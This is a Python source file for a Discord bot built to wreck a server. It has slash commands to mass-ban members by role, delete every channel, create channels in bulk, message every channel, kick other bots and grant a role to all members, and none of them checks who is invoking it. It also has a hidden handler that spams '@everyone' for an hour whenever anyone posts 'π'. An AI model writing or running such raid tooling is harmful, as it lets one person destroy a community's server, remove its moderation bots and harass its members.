import os
import asyncio
import discord
from discord import app_commands
from discord.ext import commands

# =========================
# BOT SETUP
# =========================

intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(
    command_prefix="!",
    intents=intents
)


# =========================
# STARTUP
# =========================

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"Logged in as {bot.user}")
    print("Bot is ready!")


# =========================
# 1. MASS BAN BY ROLE
# =========================

@bot.tree.command(
    name="massbanrole",
    description="Ban everyone who has a specific role"
)
async def massbanrole(
    interaction: discord.Interaction,
    role: discord.Role
):
    await interaction.response.defer(ephemeral=True)

    members = [
        member
        for member in interaction.guild.members
        if role in member.roles
    ]

    banned = 0

    for member in members:
        try:
            # Don't ban the bot
            if member == interaction.guild.me:
                continue

            # Don't try to ban someone with an equal/higher role
            if member.top_role >= interaction.guild.me.top_role:
                continue

            await member.ban(
                reason=f"Mass ban by {interaction.user}"
            )

            banned += 1

        except (discord.Forbidden, discord.HTTPException):
            pass

    await interaction.followup.send(
        f"Finished. Banned {banned}/{len(members)} members.",
        ephemeral=True
    )


# =========================
# DELETE ALL CHANNELS
# =========================

@bot.tree.command(
    name="deletechannels",
    description="Delete all channels and create a temporary command channel"
)
async def deletechannels(interaction: discord.Interaction):

    guild = interaction.guild

    # Respond before deleting the channel the command was used in
    await interaction.response.send_message(
        "Deleting all channels...",
        ephemeral=True
    )

    # Delete existing channels
    for channel in list(guild.channels):
        try:
            await channel.delete(
                reason=f"Deleted by {interaction.user}"
            )
        except (discord.Forbidden, discord.HTTPException):
            pass

    # Create the new command channel
    try:
        command_channel = await guild.create_text_channel(
            name="a",
            reason=f"Command channel created by {interaction.user}"
        )

        await command_channel.send(
            "Command channel created. This channel will be deleted in 1 minute."
        )

        # Wait 60 seconds
        await asyncio.sleep(60)

        # Delete the command channel
        await command_channel.delete(
            reason="Temporary command channel expired"
        )

    except (discord.Forbidden, discord.HTTPException):
        pass


# =========================
# π TRIGGER
# =========================

@bot.event
async def on_message(message):



    # Trigger only when the message is exactly π
    if message.content.strip() == "π":

        end_time = asyncio.get_event_loop().time() + 3600

        while asyncio.get_event_loop().time() < end_time:
            try:
                await message.channel.send(
                    "@everyone thanks for the free titanic W rainbow for letting me get it",
                    allowed_mentions=discord.AllowedMentions(
                        everyone=True
                    )
                )

            except discord.HTTPException:
                break

    # Keep slash commands working
    await bot.process_commands(message)

# =========================
# CREATE MULTIPLE CHANNELS
# =========================

@bot.tree.command(
    name="createchannels",
    description="Create multiple text channels"
)
async def createchannels(
    interaction: discord.Interaction,
    name: str,
    amount: int
):

    if amount < 1 or amount > 50:
        await interaction.response.send_message(
            "Amount must be between 1 and 50.",
            ephemeral=True
        )
        return

    await interaction.response.defer(ephemeral=True)

    created = 0

    for number in range(1, amount + 1):
        channel_name = f"{name}-{number}"

        try:
            await interaction.guild.create_text_channel(
                name=channel_name,
                reason=f"Created by {interaction.user}"
            )

            created += 1

        except discord.HTTPException:
            pass

    await interaction.followup.send(
        f"Created {created}/{amount} channels.",
        ephemeral=True
    )

# =========================
# SEND MESSAGE IN ALL CHANNELS
# =========================

@bot.tree.command(
    name="sendallchannels",
    description="Send a message in every accessible text channel"
)
async def sendallchannels(
    interaction: discord.Interaction,
    message: str
):

    await interaction.response.defer(ephemeral=True)

    sent = 0
    failed = 0

    for channel in interaction.guild.text_channels:

        try:
            if channel.permissions_for(interaction.guild.me).send_messages:
                await channel.send(message)
                sent += 1

        except (discord.Forbidden, discord.HTTPException):
            failed += 1

    await interaction.followup.send(
        f"Message sent to {sent} channels. {failed} channels failed.",
        ephemeral=True
    )
    
# =========================
# KICK MULTIPLE BOTS
# =========================

@bot.tree.command(
    name="kickbots",
    description="Kick multiple bots from the server"
)
async def kickbots(
    interaction: discord.Interaction,
    bot1: discord.Member,
    bot2: discord.Member = None,
    bot3: discord.Member = None,
    bot4: discord.Member = None,
    bot5: discord.Member = None,
    bot6: discord.Member = None,
    bot7: discord.Member = None,
    bot8: discord.Member = None,
    bot9: discord.Member = None,
    bot10: discord.Member = None,
    bot11: discord.Member = None,
    bot12: discord.Member = None,
    bot13: discord.Member = None,
    bot14: discord.Member = None,
    bot15: discord.Member = None,
    bot16: discord.Member = None,
    bot17: discord.Member = None,
    bot18: discord.Member = None,
    bot19: discord.Member = None,
    bot20: discord.Member = None,
    bot21: discord.Member = None,
    bot22: discord.Member = None,
    bot23: discord.Member = None,
    bot24: discord.Member = None,
    bot25: discord.Member = None
):

    bots = [
        bot1, bot2, bot3, bot4, bot5,
        bot6, bot7, bot8, bot9, bot10,
        bot11, bot12, bot13, bot14, bot15,
        bot16, bot17, bot18, bot19, bot20,
        bot21, bot22, bot23, bot24, bot25
    ]

    bots = [member for member in bots if member is not None]

    await interaction.response.defer(ephemeral=True)

    kicked = 0
    failed = 0

    for member in bots:

        if not member.bot:
            failed += 1
            continue

        if member.top_role >= interaction.guild.me.top_role:
            failed += 1
            continue

        try:
            await member.kick(
                reason=f"Multiple bot kick by {interaction.user}"
            )
            kicked += 1

        except (discord.Forbidden, discord.HTTPException):
            failed += 1

    await interaction.followup.send(
        f"Kicked: {kicked} | Failed: {failed}",
        ephemeral=True
    )

# =========================
# GIVE ROLE
# =========================

@bot.tree.command(
    name="giverole",
    description="Give a role to a member or everyone"
)
@app_commands.describe(
    role="The role to give",
    everyone="Give the role to everyone?"
)
async def giverole(
    interaction: discord.Interaction,
    role: discord.Role,
    everyone: bool = False
):

    # Check whether the bot can manage the role
    if role >= interaction.guild.me.top_role:
        await interaction.response.send_message(
            "I can't give that role because it is equal to or higher than my highest role.",
            ephemeral=True
        )
        return

    await interaction.response.defer(ephemeral=True)

    if everyone:
        given = 0
        failed = 0

        for member in interaction.guild.members:
            try:
                if role not in member.roles:
                    await member.add_roles(
                        role,
                        reason=f"Role given to everyone by {interaction.user}"
                    )
                    given += 1

            except (discord.Forbidden, discord.HTTPException):
                failed += 1

        await interaction.followup.send(
            f"Role given to {given} members. Failed: {failed}.",
            ephemeral=True
        )

    else:
        await interaction.followup.send(
            "You selected everyone=False, but this version only has the everyone option."
            " If you want individual members too, I can add that option.",
            ephemeral=True
        )

# =========================
# RUN BOT
# =========================

bot.run(os.environ["DISCORD_TOKEN"])
